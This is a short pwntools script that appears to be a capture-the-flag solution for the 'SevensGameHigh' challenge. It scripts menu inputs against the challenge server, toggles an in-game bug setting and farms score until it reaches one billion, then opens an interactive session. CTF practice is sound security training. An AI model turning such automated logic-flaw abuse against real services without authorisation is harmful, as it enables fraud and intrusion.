from pwn import *

context.log_level = 'DEBUG'
while True:
    try:
        # r = process('./SevensGameHigh')
        r = remote('sevensgamehigh.sstf.site', 7777)

        r.sendlineafter(b'menu:', b'5')
        r.sendlineafter(b'menu:', b'2')
        r.sendlineafter(b'menu:', b'3')
        r.sendlineafter(b'menu:', b'5')
        r.sendlineafter(b'menu:', b'7')
        r.sendlineafter(b'menu:', b'0')

        mod = 0
        cur_free = 0
        for stage in range(10000000):
            print(f"Stage {stage}")
            r.sendlineafter(b'menu:', b'1')
            l = r.recvuntil(b'Game')
            if b'Change' in l:
                if cur_free == 1:
                    r.sendline(b'3')
                    cur_free = 0
                    r.sendlineafter(b'menu:', b'5')
                    r.sendlineafter(b'menu:', b'3')
                    r.sendlineafter(b'menu:', b'7')
                    r.sendlineafter(b'menu:', b'0')
                    print("BUG SETTING OFF")
                elif cur_free == 0:
                    r.sendline(b'4')
                    cur_free = 1
                    r.sendlineafter(b'menu:', b'5')
                    r.sendlineafter(b'menu:', b'4')
                    r.sendlineafter(b'menu:', b'6')
                    r.sendlineafter(b'menu:', b'0')
                    print("BUG SETTING ON")
            elif b'Bonus' in l:
                while True:
                    r.recvuntil(b'FREE PLAY : ')
                    a = r.recvuntil(b' / ')[:-3]
                    b = r.recvuntil(b' ').strip()
                    if a == b:
                        break

            r.sendlineafter(b'menu:', b'3')
            r.recvuntil(b'Your SCORE :')
            money = int(r.recvline().strip().decode().replace(',', ''))
            r.recvuntil(b'menu:')
            if money >= 1000000000:
                r.sendline(b'1')
                r.interactive()
                exit(0)
            if money < 0:
                r.close()
                break

            print(f"Stage {stage} fin, money {money}")

            r.sendline(b'a')
            if (mod >= 1 and money < 1000000):
                mod = 0
                r.sendlineafter(b'menu:', b'2')
                r.sendlineafter(b'difficulty', b'10000')
            elif (mod == 0 and money >= 1000000) or (mod == 2 and money < 10000000):
                mod = 1
                r.sendlineafter(b'menu:', b'2')
                r.sendlineafter(b'difficulty', b'100000')
            elif (mod <= 1 and money >= 10000000):
                mod = 2
                r.sendlineafter(b'menu:', b'2')
                r.sendlineafter(b'difficulty', b'1000000')
    except:
        r.close()
